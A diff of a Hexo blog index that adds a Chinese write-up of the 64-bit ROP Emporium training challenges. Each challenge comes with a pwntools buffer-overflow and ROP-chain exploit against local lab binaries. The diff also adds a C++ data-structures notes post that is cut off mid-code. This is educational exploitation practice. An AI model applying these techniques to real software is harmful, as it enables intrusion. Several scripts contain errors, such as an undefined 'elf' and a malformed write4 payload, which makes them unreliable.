@@ -20,6 +20,82 @@
 ]]></content>
   </entry>
   <entry>
+    <title></title>
+    <url>/2025/02/14/ROP%20Emporium%EF%BC%8864%EF%BC%89%20WP/</url>
+    <content><![CDATA[<h1 id="ROP-Emporium（64）-WP"><a href="#ROP-Emporium（64）-WP" class="headerlink" title="ROP Emporium（64） WP"></a>ROP Emporium（64） WP</h1><h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1.ret2win"></a>1.ret2win</h2><p>找到后门函数ret2win的地址，利用缓冲区溢出覆盖返回地址</p>
+<p>exp</p>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, cyclic(<span class="number">40</span>) + p64(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-split"><a href="#2-split" class="headerlink" title="2.split"></a>2.split</h2><p>与ret2win大致相同，只不过这题将后门执行的命令由<code>cat flag</code>改为了<code>/bin/ls</code>，因此不能直接获取flag，但程序中给出了<code>/bin/cat flag.txt</code>这个字符串，所以只需要构造简单的ROP链就可以获取flag<img src="https://p.sda1.dev/22/d0fbba4df9c580e19acafa6f97dde4a1/image-20250214095002976.png" alt="image-20250214095002976.png"><img src="https://p.sda1.dev/22/a535261d95bc230a50941ba1fb3ea46b/image-20250214095031390.png" alt="image-20250214095031390.png">直接使用gadget将参数pop到rdi中即可。</p>
+<p>exp</p>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useful_string = <span class="number">0x601060</span></span><br><span class="line">rdi = <span class="number">0x4007c3</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*(<span class="number">32</span> + <span class="number">8</span>) + p64(rdi) + p64(useful_string) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-callme"><a href="#3-callme" class="headerlink" title="3.callme"></a>3.callme</h2><p>与第二题类似，通过ROPgadget找到对应gadget地址为0x40093c。<img src="https://p.sda1.dev/22/1cb41ee50c7c5fcaeaa5e33ef07c56c9/image-20250214100130272.png">题目里的usefulfunction也给了提示，就是让我们连续调用三个函数，并用正确的顺序和参数调用<img src="https://p.sda1.dev/22/10ea289a8a1c2305ecd3385d744cba2a/image-20250214101459928.png"></p>
+<p>然后直接构造payload即可</p>
+<p>exp</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">&quot;./callme&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">one</span> = <span class="number">0</span><span class="variable">x400720</span></span><br><span class="line"><span class="variable">two</span> = <span class="number">0</span><span class="variable">x400740</span></span><br><span class="line"><span class="variable">three</span> = <span class="number">0</span><span class="variable">x4006f0</span></span><br><span class="line"><span class="variable">ret</span> = <span class="number">0</span><span class="variable">x40093c</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> = <span class="variable">b</span><span class="string">&#x27;A&#x27;</span> *<span class="number">40</span> + <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">one</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">two</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">three</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="variable">payload</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">p.interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-write4"><a href="#4-write4" class="headerlink" title="4.write4"></a>4.write4</h2><p>用ida分析给出来的几个文件，发现libc中的print_file函数是个可以打印文件内容的函数，那这题就是用栈溢出，跳转到print_file函数去获取到flag。因此，主要是利用两个gadget来实现写字符串到data段。![image-20250214104036505](ROP Emporium（64） WP.assets&#x2F;image-20250214104036505.png)![image-20250214104227536](ROP Emporium（64） WP.assets&#x2F;image-20250214104227536.png)</p>
+<p>得到pop_r14_r15 &#x3D; 0x400690</p>
+<p>![image-20250214104448963](ROP Emporium（64） WP.assets&#x2F;image-20250214104448963.png)</p>
+<p>得到mov_r14_r15 &#x3D; 0x400628</p>
+<p>ida下拉找到data段地址![image-20250214104743879](ROP Emporium（64） WP.assets&#x2F;image-20250214104743879.png)构造exp</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">&quot;./write4&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">bss</span> = <span class="number">0</span><span class="variable">x601038</span></span><br><span class="line"><span class="variable">mov_r14_r15</span> = <span class="number">0</span><span class="variable">x400628</span></span><br><span class="line"><span class="variable">pop_r14_r15</span> = <span class="number">0</span><span class="variable">x400690</span></span><br><span class="line"><span class="variable">print_file</span> = <span class="number">0</span><span class="variable">x400510</span></span><br><span class="line"><span class="variable">data</span> = <span class="number">0</span><span class="variable">x601028</span></span><br><span class="line"><span class="variable">pop_rdi</span> = <span class="number">0</span><span class="variable">x400693</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> = <span class="variable">b</span><span class="string">&#x27;a&#x27;</span>* <span class="number">40</span> + <span class="function"><span class="title">p64</span>(<span class="variable">pop_r14_r15</span>)+<span class="title">p64</span>(<span class="variable">bss</span>+<span class="string">&quot;flag.txt&quot;</span>+<span class="title">p64</span>(<span class="variable">mov_r14_r15</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">pop_rdi</span>) + <span class="title">p64</span>(<span class="variable">bss</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">print_file</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="variable">payload</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">p.interactive</span>() </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5.badchars"></a>5.badchars</h2><p>与上一题基本一致，不过pwnme函数中添加了一个检查，不允许出现x，a，g，.</p>
+<p>![image-20250214110834422](ROP Emporium（64） WP.assets&#x2F;image-20250214110834422.png)</p>
+<p>仍旧有提供print_file的链接，可以调用这个函数。</p>
+<p>![image-20250214110642874](ROP Emporium（64） WP.assets&#x2F;image-20250214110642874.png)![image-20250214110815887](ROP Emporium（64） WP.assets&#x2F;image-20250214110815887.png)然后我们发现usefulfunction底下还有个usefulgadgets，可以让我们进行异或操作![image-20250214111659502](ROP Emporium（64） WP.assets&#x2F;image-20250214111659502.png)</p>
+<p>那么思路就是对flag.txt字符串进行异或，绕过限制，然后调整r14和r15指针，去逐个异或，然后跳转到print_file</p>
+<p>exp</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./badchars&#x27;)</span><br><span class="line"></span><br><span class="line">xor_r14r15 = 0x400628</span><br><span class="line">add_r14r15 = 0x40062c</span><br><span class="line">sub_r14r15 = 0x400630</span><br><span class="line">mov_r12r13 = 0x400634</span><br><span class="line">pop_r12r13r14r15 = 0x40069c</span><br><span class="line">pop_r14r15 = 0x4006a0</span><br><span class="line">pop_rdi = 0x4006a3</span><br><span class="line">write_addr = 0x601030</span><br><span class="line"></span><br><span class="line">badchars = &#x27;xag.&#x27;</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 40</span><br><span class="line">payload += p64(pop_r12r13r14r15) + b&#x27;flbh/tyt&#x27; + p64(write_addr) + p64(1) + p64(write_addr + 2)		</span><br><span class="line">payload += p64(mov_r12r13)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 3)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 4)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 6)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[&#x27;print_file&#x27;])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-fluff"><a href="#6-fluff" class="headerlink" title="6.fluff"></a>6.fluff</h2><p>这题和上题唯一的区别就是给的gadget不同，变成了questionableGadgets，底下三个没见过的指令![image-20250214112129447](ROP Emporium（64） WP.assets&#x2F;image-20250214112129447.png)查一下</p>
+<p>xlat指令：将[rbx+al]的值赋值给al</p>
+<p>stosb指令：将al赋值给[rdi]</p>
+<p>bextr：位域索引，第一个源操作数是原数据，第二个源操作数是索引开始位置（8位）和长度，这里可以控制rbx的值</p>
+<p>然后再找到这两个gadget</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00000000004006a3</span> : <span class="keyword">pop</span> <span class="built_in">rdi</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000000400639</span> : <span class="keyword">stosb</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span> <span class="comment">; ret</span></span><br></pre></td></tr></table></figure>
+
+<p>能够将寄存器的值赋值到内存中的只有stosb指令，我们有pop rdi; ret的gadget，因此可以控制stosb指令将al的值写到哪里。而xlat可以将内存中的一个值写入al。但首先，我们需要控制rbx的值，这样才能够在内存中寻找正确的字节。而对于rbx，我们又可以使用bextr指令，控制rcx和rdx后，我们可以在rbx中写入任意值。这样就可以通过修改rbx 来修改al。</p>
+<p>exp</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">xlat</span> = <span class="number">0x400628</span></span><br><span class="line"><span class="keyword">bextr</span> = <span class="number">0x40062A</span></span><br><span class="line"><span class="keyword">stosb</span> = <span class="number">0x400639</span></span><br><span class="line">zero_seg = <span class="number">0x600fa0</span>			</span><br><span class="line">write_addr = <span class="number">0x601038</span></span><br><span class="line"><span class="built_in">rdi</span> = <span class="number">0x4006A3</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line">char_addr = [<span class="number">0x4003C4</span>, <span class="number">0x4003C1</span>, <span class="number">0x4003D6</span>, <span class="number">0x4003CF</span>, <span class="number">0x4003C9</span>, <span class="number">0x4003D8</span>, <span class="number">0x400246</span>, <span class="number">0x4003D8</span>]</span><br><span class="line">char = [ord(x) for x <span class="keyword">in</span> <span class="string">&#x27;flag.txt&#x27;</span>]</span><br><span class="line">print(char)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(<span class="built_in">rdi</span>) + p64(write_addr)			</span><br><span class="line">payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(zero_seg - <span class="number">0x3EF2</span> - <span class="number">0xb</span>)		</span><br><span class="line">payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(char_addr[<span class="number">0</span>] - <span class="number">0x3EF2</span>)</span><br><span class="line">payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">payload += p64(<span class="keyword">stosb</span>)</span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(char_addr[i + <span class="number">1</span>] - char[i] - <span class="number">0x3EF2</span>)	</span><br><span class="line">	payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">	payload += p64(<span class="keyword">stosb</span>)</span><br><span class="line">payload += p64(<span class="built_in">rdi</span>) + p64(write_addr)</span><br><span class="line">payload += p64(elf<span class="number">.</span>plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7.pivot"></a>7.pivot</h2><p>是一道栈迁移的题目</p>
+<p>找到经典usefulgadgets![image-20250214113945044](ROP Emporium（64） WP.assets&#x2F;image-20250214113945044.png)</p>
+<p>通过mov rax, [rax]我们能够控制rax的值，就可以将任意地址的值写入到rax中</p>
+<p>上面的uselessfunction还提供了提供了_foothold_function函数，在so库中查看![image-20250214114742265](ROP Emporium（64） WP.assets&#x2F;image-20250214114742265.png)发现没什么用，但是可以用于延迟绑定后提供该so库的地址泄露</p>
+<p>后门函数同上是ret2win</p>
+<p>所以思路就是覆盖rbp，跳转到leave ret完成迁移，执行_foothold_function函数，打印got表，泄露地址，拿到ret2win的地址，返回pwnme，调用ret2win</p>
+<p>exp</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pivot&#x27;)</span><br><span class="line">lib = ELF(&#x27;./libpivot.so&#x27;)</span><br><span class="line"></span><br><span class="line">rax = 0x4009bb</span><br><span class="line">rsp = 0x4009bd</span><br><span class="line">rax_addr = 0x4009c0</span><br><span class="line">add_rax = 0x4009c4</span><br><span class="line">jmp_rax = 0x4007c1</span><br><span class="line">main_addr = 0x400847</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;place to pivot: 0x&#x27;)</span><br><span class="line">stack = int(p.recv(12).decode(), 16)</span><br><span class="line">payload = p64(elf.plt[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax) + p64(elf.got[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax_addr)		</span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(jmp_rax)</span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line">payload = b&#x27;a&#x27;*32	</span><br><span class="line">payload += p64(lib.symbols[&#x27;ret2win&#x27;] - lib.symbols[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax) + p64(stack)	</span><br><span class="line">payload += p64(rsp)						</span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8.ret2csu"></a>8.ret2csu</h2><p>仍旧有后门函数ret2win![image-20250214132031877](ROP Emporium（64） WP.assets&#x2F;image-20250214132031877.png)只要三个参数符合要求即可</p>
+<p>在这个片段我们可以控制一系列寄存器的值![image-20250214132401399](ROP Emporium（64） WP.assets&#x2F;image-20250214132401399.png)再用ROPgadgets查找![image-20250214132609643](ROP Emporium（64） WP.assets&#x2F;image-20250214132609643.png)</p>
+<p>发现pop rdi; ret实际上是将原来的pop r15指令拆掉了，上面的pop rsi, ret也一样</p>
+<p>第三个函数参数在rdx中保存，但我们没办法rdx，这就用到第二个片段了![image-20250214133130717](ROP Emporium（64） WP.assets&#x2F;image-20250214133130717.png)但是对edi的赋值出现了一点问题，mov edi, r13d只赋值四个字节，高4字节赋值不了，而我们找到一个片段</p>
+<p>它将rsp减8又加8![image-20250214141115280](ROP Emporium（64） WP.assets&#x2F;image-20250214141115280.png)我们试试看，但还需要在内存空间中找到一个保存着这个代码段地址的地方，因为call的地址是取值拿到的，所以不能直接将地址放在寄存器中。我们在IDA中尝试搜索，还真有</p>
+<p>![image-20250214134158024](ROP Emporium（64） WP.assets&#x2F;image-20250214134158024.png)</p>
+<p>这里rbp和rbx都是之前控制的，我们需要让这个跳转不成立，就需要rbx+1&#x3D;&#x3D;rbp的值</p>
+<p>完成之后，再rsp+8，pop6个值之后就是下一个返回地址，这样就可以跳过call直接返回,来修改rdi的值，从这里去修改rdi为目标值，然后跳转去win函数即可。![image-20250214144108583](ROP Emporium（64） WP.assets&#x2F;image-20250214144108583.png)</p>
+<p>exp</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span> = process(&#x27;./ret2csu&#x27;)</span><br><span class="line"><span class="attribute">lib</span> = ELF(&#x27;./libret2csu.so&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">ROP_1</span> = <span class="number">0</span>x40069a</span><br><span class="line"><span class="attribute">ROP_2</span> = <span class="number">0</span>x400680</span><br><span class="line"><span class="attribute">rdi</span> = <span class="number">0</span>x4006a3</span><br><span class="line"><span class="attribute">call</span> = <span class="number">0</span>x400689</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span> = b&#x27;a&#x27;*<span class="number">40</span></span><br><span class="line"><span class="attribute">payload</span> += p64(rdi) + p64(<span class="number">0</span>xdeadbeefdeadbeef)</span><br><span class="line"><span class="attribute">payload</span> += p64(ROP_1)</span><br><span class="line"><span class="attribute">payload</span> += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>x4003B0) + p64(<span class="number">0</span>xdeadbeefdeadbeef) + p64(<span class="number">0</span>xcafebabecafebabe) + p64(<span class="number">0</span>xd00df00dd00df00d)</span><br><span class="line"><span class="attribute">payload</span> += p64(ROP_2)</span><br><span class="line"><span class="attribute">payload</span> += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"><span class="attribute">payload</span> += p64(rdi) + p64(<span class="number">0</span>xdeadbeefdeadbeef) </span><br><span class="line"><span class="attribute">payload</span> += p64(elf.plt[&#x27;ret2win&#x27;])</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2024/09/08/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -40,22 +116,21 @@
 ]]></content>
   </entry>
   <entry>
-    <title>博客搭建</title>
-    <url>/2024/10/12/%E6%96%87%E7%AB%A0/</url>
-    <content><![CDATA[<h1 id="搭建心路"><a href="#搭建心路" class="headerlink" title="搭建心路"></a>搭建心路</h1><span id="more"></span>
+    <title></title>
+    <url>/2025/03/23/cpp%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<p>准备一下蓝桥杯</p>
+<p>顺手存点代码</p>
+<h1 id="一、基本常见代码"><a href="#一、基本常见代码" class="headerlink" title="一、基本常见代码"></a>一、基本常见代码</h1><h2 id="1-动态数组"><a href="#1-动态数组" class="headerlink" title="1.动态数组"></a>1.动态数组</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建动态数组</span></span><br><span class="line"><span class="comment">// 不用显式指定数组大小，它会根据实际存储的元素数量自动扩缩容</span></span><br><span class="line">ArrayList&lt;Integer&gt; arr = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// 在末尾追加元素，时间复杂度 O(1)</span></span><br><span class="line">    arr.<span class="keyword">add</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在中间插入元素，时间复杂度 O(N)</span></span><br><span class="line"><span class="comment">// 在索引 2 的位置插入元素 666</span></span><br><span class="line">arr.<span class="keyword">add</span>(<span class="number">2</span>, <span class="number">666</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在头部插入元素，时间复杂度 O(N)</span></span><br><span class="line">arr.<span class="keyword">add</span>(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除末尾元素，时间复杂度 O(1)</span></span><br><span class="line">arr.<span class="keyword">remove</span>(arr.size() - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除中间元素，时间复杂度 O(N)</span></span><br><span class="line"><span class="comment">// 删除索引 2 的元素</span></span><br><span class="line">arr.<span class="keyword">remove</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据索引查询元素，时间复杂度 O(1)</span></span><br><span class="line"><span class="built_in">int</span> a = arr.<span class="keyword">get</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据索引修改元素，时间复杂度 O(1)</span></span><br><span class="line">arr.<span class="keyword">set</span>(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据元素值查找索引，时间复杂度 O(N)</span></span><br><span class="line"><span class="built_in">int</span> index = arr.indexOf(<span class="number">666</span>);</span><br></pre></td></tr></table></figure>
 
-<h2 id="一、准备工具-环境"><a href="#一、准备工具-环境" class="headerlink" title="一、准备工具&#x2F;环境"></a>一、准备工具&#x2F;环境</h2><p>  一个趁手的魔法上网工具（GitHub真的好慢），node.js，hexo，typora，git（这玩意官网下也好慢）</p>
-<h2 id="二、博客的搭建"><a href="#二、博客的搭建" class="headerlink" title="二、博客的搭建"></a>二、博客的搭建</h2><p>  工欲善其事，必先利其器。为了流畅且丝滑的搭建博客，我浏览了一些B站视频，并从中选取了最短的一个来作为学习模板（懒狗一条了属于是）。在搭建过程中仅有一次报错，为“error deployer not found: git“，在 csdn上了解到，这是由于没有安装hexo-deployer-git插件，根据网址的教学运行npm install hexo-deployer-git –save便成功解决</p>
-<p>  搭建过程中并没有截什么图，便自然只有文字了</p>
-<h2 id="三、搭建过程"><a href="#三、搭建过程" class="headerlink" title="三、搭建过程"></a>三、搭建过程</h2><p>  1.安装所需软件并配置环境</p>
-<p>  2.去GitHub白嫖免费服务器并搞定ssh链接</p>
-<p> 3.更改一些_config.yaml下的配置</p>
-<p> 4.改个主题并部署网页</p>
-<h2 id="四、参考的视频以及文章"><a href="#四、参考的视频以及文章" class="headerlink" title="四、参考的视频以及文章"></a>四、参考的视频以及文章</h2><p>参考的视频以及文章</p>
-<p>  感谢各位前辈留下的宝贵资料</p>
-<p><a href="https://blog.csdn.net/qq_41688840/article/details/125826614">部署hexo遇到报错ERROR Deployer not found: git的解决办法-CSDN博客</a></p>
-<p>[<a href="https://www.bilibili.com/video/BV1Eg41157tL/?spm_id_from=333.337.search-card.all.click&vd_source=0a239ca12066e72b92ef0094a8ca6ef0">教程]Hexo &amp; Github搭建自己的专属博客_哔哩哔哩_bilibili</a></p>
-<h2 id="五、在搭建博客中有感"><a href="#五、在搭建博客中有感" class="headerlink" title="五、在搭建博客中有感"></a>五、在搭建博客中有感</h2><p>  博客的搭建需要一些耐心和善用搜索引擎，大部分问题前人都给了详尽的回答，我们只需要站在巨人的肩膀上，到虽然我没有遇到多少报错，但是从帮助舍友搭建博客时来看，几乎现阶段能遇到的所有报错都可以在网上找到解决方式，甚至有的报错只需要翻译一下就能看懂错在哪里。</p>
+<h2 id="2-双向链表"><a href="#2-双向链表" class="headerlink" title="2.双向链表"></a>2.双向链表</h2><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> DoublyListNode &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    DoublyListNode *<span class="keyword">next</span>, *prev;</span><br><span class="line">    DoublyListNode(<span class="keyword">int</span> x) : val(x), <span class="keyword">next</span>(<span class="keyword">NULL</span>), prev(<span class="keyword">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DoublyListNode* createDoublyLinkedList(vector&lt;<span class="keyword">int</span>&gt;&amp; arr) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr.empty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DoublyListNode* head = <span class="keyword">new</span> DoublyListNode(arr[<span class="number">0</span>]);</span><br><span class="line">    DoublyListNode* cur = head;</span><br><span class="line">    <span class="comment">// for 循环迭代创建双链表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.<span class="keyword">size</span>(); i++) &#123;</span><br><span class="line">        DoublyListNode* newNode = <span class="keyword">new</span> DoublyListNode(arr[i]);</span><br><span class="line">        cur-&gt;<span class="keyword">next</span> = newNode;</span><br><span class="line">        newNode-&gt;prev = cur;</span><br><span class="line">        cur = cur-&gt;<span class="keyword">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完整代码</p>
+<p>双链表</p>
+<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdexcept&gt;</span><br><span class="line"></span><br><span class="line">template&lt;typename E&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinkedList</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 虚拟头尾节点</span></span><br><span class="line">    struct Node &#123;</span><br><span class="line">        E val;</span><br><span class="line">        Node* next;</span><br><span class="line">        Node* prev;</span><br><span class="line"></span><br><span class="line">        Node(E value) : val(value), next(nullptr), prev(nullptr) &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Node* head;</span><br><span class="line">    Node* tail;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数初始化虚拟头尾节点</span></span><br><span class="line">    MyLinkedList() &#123;</span><br><span class="line">        head = <span class="keyword">new</span> Node(E());</span><br><span class="line">        tail = <span class="keyword">new</span> Node(E());</span><br><span class="line">        head-&gt;next = tail;</span><br><span class="line">        tail-&gt;prev = head;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 增 *****</span></span><br><span class="line"></span><br><span class="line">    void addLast(E e) &#123;</span><br><span class="line">        Node* x = <span class="keyword">new</span> Node(e);</span><br><span class="line">        Node* temp = tail-&gt;prev;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; x</span></span><br><span class="line">        temp-&gt;next = x;</span><br><span class="line">        x-&gt;prev = temp;</span><br><span class="line"></span><br><span class="line">        x-&gt;next = tail;</span><br><span class="line">        tail-&gt;prev = x;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; x &lt;-&gt; tail</span></span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void addFirst(E e) &#123;</span><br><span class="line">        Node* x = <span class="keyword">new</span> Node(e);</span><br><span class="line">        Node* temp = head-&gt;next;</span><br><span class="line">        <span class="comment">// head &lt;-&gt; temp</span></span><br><span class="line">        temp-&gt;prev = x;</span><br><span class="line">        x-&gt;next = 